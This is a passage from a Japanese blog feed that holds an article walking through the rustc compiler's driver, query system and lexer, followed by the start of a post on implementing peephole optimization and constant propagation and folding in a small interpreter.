&lt;p&gt;rustcの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;は以下にあります。&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Frust-lang%2Frust&quot; title=&quot;GitHub - rust-lang/rust: Empowering everyone to build reliable and efficient software.&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/rust-lang/rust&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C7%A5%A3%A5%EC%A5%AF%A5%C8&quot;&gt;ディレクト&lt;/a&gt;リは以下の通り&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;compiler : rustc本体&lt;/li&gt;
&lt;li&gt;library : 標準ライブラリ&lt;/li&gt;
&lt;li&gt;src : テストスイート、rustdocなど&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;この記事ではcompilerフォルダ以下の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;ドライバ、レクサー、パーサーを中心に見ていきます。&lt;/p&gt;

&lt;h1&gt;DriverとInterfaceまわり&lt;/h1&gt;

&lt;p&gt;rustcの実質的なエントリーポイントは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;ドライバのクレート (/compiler/rustc_driver) の&lt;a href=&quot;https://github.com/rust-lang/rust/blob/master/compiler/rustc_driver/src/lib.rs#L1356-L1384&quot;&gt;main関数&lt;/a&gt;です。
main関数から、&lt;a href=&quot;https://github.com/rust-lang/rust/blob/master/compiler/rustc_driver/src/lib.rs#L192-L438&quot;&gt;RunCompiler.run&lt;/a&gt;関数が呼び出され、その内部で以下の&lt;code&gt;interface::run_compiler&lt;/code&gt;関数が呼び出されます。&lt;/p&gt;

&lt;p&gt;rustc_interfaceクレートはrustcをライブラリとして使うときの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;のエントリーポイントになります。(理由は外部から&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B5%A1%BC%A5%C9%A5%D1%A1%BC%A5%C6%A5%A3&quot;&gt;サードパーティ&lt;/a&gt;製の解析や最適化をかけるため)&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;main&lt;/span&gt;() &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;!&lt;/span&gt; {
    ...
    &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; exit_code &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;catch_with_exit_code&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;||&lt;/span&gt; {
        &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; args &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;args_os&lt;/span&gt;()
            .&lt;span class=&quot;synIdentifier&quot;&gt;enumerate&lt;/span&gt;()... ;
        &lt;span class=&quot;synComment&quot;&gt;// run内部で以下のrun_compiler関数が呼び出される&lt;/span&gt;
        &lt;span class=&quot;synPreProc&quot;&gt;RunCompiler&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;new&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;args, &lt;span class=&quot;synType&quot;&gt;&amp;amp;mut&lt;/span&gt; callbacks).&lt;span class=&quot;synIdentifier&quot;&gt;run&lt;/span&gt;()
    });
    ...
    &lt;span class=&quot;synPreProc&quot;&gt;process&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;exit&lt;/span&gt;(exit_code)
}
&lt;/pre&gt;




&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;pub&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;run_compiler&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;R: &lt;span class=&quot;synType&quot;&gt;Send&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;mut&lt;/span&gt; config: Config, f: &lt;span class=&quot;synStatement&quot;&gt;impl&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;FnOnce&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;Compiler) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; R &lt;span class=&quot;synStatement&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Send&lt;/span&gt;) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; R {
    &lt;span class=&quot;synPreProc&quot;&gt;tracing&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;trace!&lt;/span&gt;(&lt;span class=&quot;synConstant&quot;&gt;&amp;quot;run_compiler&amp;quot;&lt;/span&gt;);
    ...
    &lt;span class=&quot;synComment&quot;&gt;// configからCompiler構造体を作りクロージャ内に渡す&lt;/span&gt;
    &lt;span class=&quot;synPreProc&quot;&gt;interface&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;run_compiler&lt;/span&gt;(config, &lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt;compiler&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt; {
        ...
        &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; linker &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; compiler.&lt;span class=&quot;synIdentifier&quot;&gt;enter&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt;queries&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt; {
            &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; early_exit &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synStatement&quot;&gt;||&lt;/span&gt; sess.&lt;span class=&quot;synIdentifier&quot;&gt;compile_status&lt;/span&gt;().&lt;span class=&quot;synIdentifier&quot;&gt;map&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt;_&lt;span class=&quot;synStatement&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;None&lt;/span&gt;);
            &lt;span class=&quot;synComment&quot;&gt;// パースを行うクエリを起動する&lt;/span&gt;
            queries.&lt;span class=&quot;synIdentifier&quot;&gt;parse&lt;/span&gt;()&lt;span class=&quot;synSpecial&quot;&gt;?&lt;/span&gt;;
            ...
        })
    ...
}
&lt;/pre&gt;


&lt;p&gt;この&lt;code&gt;rustc_driver::run_compiler&lt;/code&gt;関数では第一引数のconfigからCompiler構造体を作り、第二引数の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%AF%A5%ED%A1%BC%A5%B8%A5%E3&quot;&gt;クロージャ&lt;/a&gt;に渡しています。configには&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%DE%A5%F3%A5%C9%A5%E9%A5%A4%A5%F3&quot;&gt;コマンドライン&lt;/a&gt;引数や出力ファイル名といった&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;の設定情報が入っています。&lt;/p&gt;

&lt;p&gt;また、注目すべき箇所は&lt;code&gt;queries.parse()?&lt;/code&gt;の行です。これは要求駆動&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;の処理の一部になっています。この関数を追っていくと、&lt;code&gt;rustc_parser::parse_crate_from_file&lt;/code&gt;関数にたどり着きますが、ここで実際に&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;のパースが行われます。&lt;/p&gt;

&lt;h2&gt;要求駆動&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;&lt;/h2&gt;

&lt;p&gt;要求駆動&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;は、メモ化を利用した高速な&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;方法です。クエリを使うことで差分に注目するインクリメンタルな&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;が可能になります。&lt;/p&gt;

&lt;p&gt;クエリは入力に対して、何かを計算して出力します。
例えば type_of クエリはあるアイテムの def_id が与えられるとそのアイテムの型を計算します。&lt;/p&gt;

&lt;p&gt;例えば、実際の&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;全体はクエリ駆動になります。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;トッ&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%D7%A5%EC%A5%D9&quot;&gt;プレベ&lt;/a&gt;ルの compile クエリがコード生成の必要があるモジュールのリスト (&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/codegen&quot;&gt;codegen&lt;/a&gt;-units)を取得する&lt;/li&gt;
&lt;li&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/codegen&quot;&gt;codegen&lt;/a&gt;-units のリストを計算する際に、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;で定義されているすべてのモジュールのリストを返すクエリがさらに呼び出される&lt;/li&gt;
&lt;li&gt;呼び出されたクエリによって、さらにクエリを呼び出される&lt;/li&gt;
&lt;li&gt;以下繰り返し&lt;/li&gt;
&lt;/ol&gt;


&lt;h1&gt;ParserとLexer&lt;/h1&gt;

&lt;p&gt;パーサー (/compiler/rustc_parser/src/parser) では、Parser構造体に対して実装されている&lt;code&gt;parse_xxxx&lt;/code&gt;の名前の関数がxxxxをパースします。(例えばparse_stmt, parse_exprはそれぞれ文と式をパースします。)&lt;/p&gt;

&lt;p&gt;レクサー (/compiler/rustc_parser/src/lexer) は内部で別のrustc_lexerクレートを使っていて、このクレートで文字列のパターンマッチを行います。
(以前は同じクレートだったけど、ライブラリ化するために分けたそうです。)&lt;/p&gt;

&lt;p&gt;次の&lt;code&gt;cook_lexer_token&lt;/code&gt;関数はrustc_lexerクレートの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ンをrustc_parserで扱うための&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ンに変換しています。&lt;/p&gt;

&lt;pre class=&quot;code lang-rust&quot; data-lang=&quot;rust&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;fn&lt;/span&gt; &lt;span class=&quot;synIdentifier&quot;&gt;cook_lexer_token&lt;/span&gt;(&lt;span class=&quot;synType&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;, token: &lt;span class=&quot;synPreProc&quot;&gt;rustc_lexer&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;TokenKind, start: BytePos) &lt;span class=&quot;synStatement&quot;&gt;-&amp;gt;&lt;/span&gt; &lt;span class=&quot;synType&quot;&gt;Option&lt;/span&gt;&lt;span class=&quot;synStatement&quot;&gt;&amp;lt;&lt;/span&gt;TokenKind&lt;span class=&quot;synStatement&quot;&gt;&amp;gt;&lt;/span&gt; {
        &lt;span class=&quot;synConstant&quot;&gt;Some&lt;/span&gt;(&lt;span class=&quot;synStatement&quot;&gt;match&lt;/span&gt; token {
            ....
            &lt;span class=&quot;synPreProc&quot;&gt;rustc_lexer&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;TokenKind&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Semi &lt;span class=&quot;synStatement&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Semi, &lt;span class=&quot;synComment&quot;&gt;// ;&lt;/span&gt;
            &lt;span class=&quot;synPreProc&quot;&gt;rustc_lexer&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;TokenKind&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Comma &lt;span class=&quot;synStatement&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Comma, &lt;span class=&quot;synComment&quot;&gt;// ,&lt;/span&gt;
            &lt;span class=&quot;synPreProc&quot;&gt;rustc_lexer&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;TokenKind&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Dot &lt;span class=&quot;synStatement&quot;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Dot, &lt;span class=&quot;synComment&quot;&gt;// .&lt;/span&gt;
            ...
            &lt;span class=&quot;synPreProc&quot;&gt;rustc_lexer&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synPreProc&quot;&gt;TokenKind&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;Lifetime { starts_with_number } &lt;span class=&quot;synStatement&quot;&gt;=&amp;gt;&lt;/span&gt; {
                &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; lifetime_name &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.&lt;span class=&quot;synIdentifier&quot;&gt;str_from&lt;/span&gt;(start);
                &lt;span class=&quot;synStatement&quot;&gt;if&lt;/span&gt; starts_with_number {
                    &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.&lt;span class=&quot;synIdentifier&quot;&gt;err_span_&lt;/span&gt;(start, &lt;span class=&quot;synConstant&quot;&gt;self&lt;/span&gt;.pos, &lt;span class=&quot;synConstant&quot;&gt;&amp;quot;lifetimes cannot start with a number&amp;quot;&lt;/span&gt;);
                }
                &lt;span class=&quot;synComment&quot;&gt;// String Interningを行う&lt;/span&gt;
                &lt;span class=&quot;synStatement&quot;&gt;let&lt;/span&gt; ident &lt;span class=&quot;synStatement&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;synPreProc&quot;&gt;Symbol&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;intern&lt;/span&gt;(lifetime_name);
                &lt;span class=&quot;synPreProc&quot;&gt;token&lt;/span&gt;&lt;span class=&quot;synSpecial&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;synIdentifier&quot;&gt;Lifetime&lt;/span&gt;(ident)
            }
            ...
    })
}
&lt;/pre&gt;


&lt;p&gt;また、レクサーは同時にString Interningを行います。これは、&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;時のメモリを節約するためのテクニックです。
一つの文字列に対して一つのポインタを対応させます。同じ文字列が同じ場所を指し、異なる文字列が異なる場所を指すようにすることで、文字列の長さの分だけメモリの使用量が削減できます。&lt;/p&gt;

&lt;p&gt;先ほどのコードでは&lt;code&gt;let ident = Symbol::intern(lifetime_name);&lt;/code&gt;の行でライフタイム名を対象にしたString Interningが行われています。&lt;/p&gt;

&lt;p&gt;パースが終了したら、&lt;code&gt;interface::run_compiler&lt;/code&gt;関数で新たなクエリが呼び出され、次のステップへと進みます。&lt;/p&gt;

&lt;h1&gt;おわりに&lt;/h1&gt;

&lt;p&gt;rustcの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%BD%A1%BC%A5%B9%A5%B3%A1%BC%A5%C9&quot;&gt;ソースコード&lt;/a&gt;は巨大でざっくり読もうとするだけでも時間がかかりました。僕はまだ読み始めたばかりですが、rustc dev guideなどドキュメントが充実していてとても読みかったです。これからは、ASTや型まわりを中心に読んでいって、時間があれば記事にまとめたいと思います。&lt;/p&gt;

&lt;p&gt;明日のカレンダーの記事はそすうぽよさんの「数え上げお姉さんよ永遠なれ」です&lt;/p&gt;
</description>          <pubDate>Fri, 03 Dec 2021 17:25:06 +0900</pubDate>
          <guid isPermaLink="false">hatenablog://entry/13574176438036564727</guid>
          
            <category>言語処理系</category>
          
            <category>Rust</category>
          
          <enclosure url="https://ogimage.blog.st-hatena.com/26006613542645241/13574176438036564727/1638952835" type="image/png" length="0" />
        </item>
      
    
      
      
        <item>
          <title>コンパイラ最適化を実装する</title>
          <link>https://tamaron.hatenablog.com/entry/2021/11/20/165929</link>          <description>&lt;p&gt;自作した&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A5%D7%A5%EA%A5%BF&quot;&gt;インタプリタ&lt;/a&gt;にいくつかの&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;最適化を実装したので、そのときのメモを残しておく。&lt;/p&gt;

&lt;p&gt;作ったもの&lt;/p&gt;

&lt;p&gt;&lt;iframe src=&quot;https://hatenablog-parts.com/embed?url=https%3A%2F%2Fgithub.com%2Ftamaroning%2Fharibote-lang&quot; title=&quot;GitHub - tamaroning/haribote-lang: A simple interpreter w/ static analysis and constant optimization&quot; class=&quot;embed-card embed-webcard&quot; scrolling=&quot;no&quot; frameborder=&quot;0&quot; style=&quot;display: block; width: 100%; height: 155px; max-width: 500px; margin: 10px 0px;&quot;&gt;&lt;/iframe&gt;&lt;cite class=&quot;hatena-citation&quot;&gt;&lt;a href=&quot;https://github.com/tamaroning/haribote-lang&quot;&gt;github.com&lt;/a&gt;&lt;/cite&gt;&lt;/p&gt;

&lt;p&gt;入力したプログラムは以下の順で処理される。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Lex : プログラムを&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列に変換&lt;/li&gt;
&lt;li&gt;Parse : &lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列を中間表現に変換&lt;/li&gt;
&lt;li&gt;Optimize : 中間表現に手を加えて最適化する&lt;/li&gt;
&lt;li&gt;Execute : 中間表現を実行する&lt;/li&gt;
&lt;/ol&gt;


&lt;p&gt;この&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%A4%A5%F3%A5%BF%A5%D7%A5%EA%A5%BF&quot;&gt;インタプリタ&lt;/a&gt;では&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%B9%BD%CA%B8%CC%DA&quot;&gt;構文木&lt;/a&gt;を介さずに&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%C8%A1%BC%A5%AF&quot;&gt;トーク&lt;/a&gt;ン列から直接的に中間表現に変換している。中間表現は&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt; IRのサブセットに近い。&lt;/p&gt;

&lt;p&gt;以下ではOptimizeについて詳しく見ていく&lt;/p&gt;

&lt;h1&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%E9&quot;&gt;コンパイラ&lt;/a&gt;最適化とは&lt;/h1&gt;

&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;過程において中間表現/&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%B9%BD%CA%B8%CC%DA&quot;&gt;構文木&lt;/a&gt;をより良い中間表現/&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%B9%BD%CA%B8%CC%DA&quot;&gt;構文木&lt;/a&gt;に変換すること。&lt;/p&gt;

&lt;p&gt;主な目的は&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;命令数が少ない (バイナリのサイズを減らす)&lt;/li&gt;
&lt;li&gt;実行速度を速くする&lt;/li&gt;
&lt;/ul&gt;


&lt;p&gt;&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/LLVM&quot;&gt;LLVM&lt;/a&gt;や&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/GCC&quot;&gt;GCC&lt;/a&gt;などが有名。&lt;/p&gt;

&lt;h2&gt;アプローチ&lt;/h2&gt;

&lt;p&gt;最適化を行うためには、まず中間表現全体の静的な解析が必要。&lt;/p&gt;

&lt;p&gt;静的解析は以下の二つにわけられる。&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;制御フロー解析 (Control-flow analysis)&lt;/li&gt;
&lt;li&gt;データフロー解析 (Data-flow analysis)&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;制御フロー解析&lt;/h2&gt;

&lt;p&gt;プログラムを基本ブロック(Basic block)と辺(Edge)からなる有向グラフに変換する。
基本ブロック内では、前から後ろに一直線に処理が走る。辺には基本ブロック間の処理の移動を表す。
基本ブロックの最後に、条件分岐や無条件分岐がある場合は、その場所から別の基本ブロックへ辺が作られる。(条件分岐では一つのノードから二本の辺が出ることになる) こうしてできたグラフを制御フローグラフ(Control-flow graph: CFG)という。&lt;/p&gt;

&lt;h2&gt;データフロー解析&lt;/h2&gt;

&lt;p&gt;具体的な最適化を行うために必要な情報を、制御フローグラフを用いて収集する。&lt;/p&gt;

&lt;p&gt;例えば、あるノード&lt;code&gt;a = x&lt;/code&gt; に対して定数伝播/畳み込み(後述)を行う場合、 &lt;em&gt;x&lt;/em&gt; が定数であるという情報が必要である。この場合は、どのような制御フローを介してノードに到達しても、必ずそのノードでは &lt;em&gt;x=C&lt;/em&gt; で一定であることを証明することになる。&lt;/p&gt;

&lt;p&gt;一般的にサイクリックな制御フローの解析は難しい。&lt;/p&gt;

&lt;h1&gt;実際に実装した最適化&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;覗き穴最適化 (Peekhole Optimization)&lt;/li&gt;
&lt;li&gt;定数伝播 (Constant Propagation)&lt;/li&gt;
&lt;li&gt;定数畳み込み (Constant Folding)&lt;/li&gt;
&lt;li&gt;到達不可能コードの削除&lt;/li&gt;
&lt;/ul&gt;


&lt;h2&gt;覗き穴最適化&lt;/h2&gt;

&lt;p&gt;以下のような変換を行う。&lt;/p&gt;

&lt;p&gt;before&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;goto&lt;/span&gt; A;
&lt;span class=&quot;synStatement&quot;&gt;A&lt;/span&gt;:
&lt;span class=&quot;synStatement&quot;&gt;goto&lt;/span&gt; B;
&lt;span class=&quot;synStatement&quot;&gt;B&lt;/span&gt;:
&lt;span class=&quot;synComment&quot;&gt;/* 何らかの処理 */&lt;/span&gt; 
&lt;/pre&gt;


&lt;p&gt;after&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;&lt;span class=&quot;synStatement&quot;&gt;goto&lt;/span&gt; B;
&lt;span class=&quot;synStatement&quot;&gt;A&lt;/span&gt;:
&lt;span class=&quot;synStatement&quot;&gt;goto&lt;/span&gt; B;
&lt;span class=&quot;synStatement&quot;&gt;B&lt;/span&gt;:
&lt;span class=&quot;synComment&quot;&gt;/* 何らかの処理 */&lt;/span&gt;
&lt;/pre&gt;


&lt;p&gt;まず、1行目の&lt;code&gt;goto A&lt;/code&gt;を見る。ジャンプ先Aではさらに無条件分岐&lt;code&gt;goto B&lt;/code&gt;が呼ばれているので、&lt;code&gt;goto A&lt;/code&gt;の最終的なジャンプ先はBである。
&lt;code&gt;goto A&lt;/code&gt;は&lt;code&gt;goto B&lt;/code&gt;で置き換えられる。&lt;/p&gt;

&lt;p&gt;同様に、3行目の&lt;code&gt;goto B&lt;/code&gt;の最終的なジャンプ先はBだが、これは命令を置き換えなくても済む。&lt;/p&gt;

&lt;h3&gt;実装&lt;/h3&gt;

&lt;p&gt;制御フローグラフを構築しなくてもよく、分岐先を&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%BA%C6%B5%A2&quot;&gt;再帰&lt;/a&gt;的に辿ることでできる。ただし、&lt;code&gt;A: goto A&lt;/code&gt;のように循環する場合を検出する必要がある。&lt;/p&gt;

&lt;h2&gt;定数伝播 &amp;amp;定数畳み込み&lt;/h2&gt;

&lt;p&gt;定数伝播と定数畳み込みは&lt;a class=&quot;keyword&quot; href=&quot;http://d.hatena.ne.jp/keyword/%A5%B3%A5%F3%A5%D1%A5%A4%A5%EB&quot;&gt;コンパイル&lt;/a&gt;時に定数を計算するためのテクニックである。
以下のような置き換えを行う。&lt;/p&gt;

&lt;p&gt;before&lt;/p&gt;

&lt;pre class=&quot;code lang-c&quot; data-lang=&quot;c&quot; data-unlink&gt;a = &lt;span class=&quot;synConstant&quot;&gt;2&lt;/span&gt;;
b = a * &lt;span class=&quot;synConstant&quot;&gt;3&lt;/span&gt;;
c = b + &lt;span class=&quot;synConstant&quot;&gt;4&lt;/span&gt;;
&lt;/pre&gt;


&lt;p&gt;after&lt;/p&gt;

&lt;pre class=&quot;code&quot; data-lang=&quot;&quot; data-unlink&gt;a = 2;
b = 6;
c = 10;&lt;/pre&gt;


&lt;p&gt;この場合は、以下のステップごとに行われる。&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;1行目: a = 2は定数&lt;/li&gt;
&lt;li&gt;2行目: a は 2 で置き換える (伝播)&lt;/li&gt;
&lt;li&gt;2行目: b = 2 * 3 = 6 を計算する (畳み込み)&lt;/li&gt;
&lt;li&gt;3行目: b = 6 で置き換える (伝播)&lt;/li&gt;
&lt;li&gt;3行目: c = 6 + 4 を計算する (畳み込み)&lt;/li&gt;
&lt;/ol&gt;


&lt;h3&gt;実装&lt;/h3&gt;

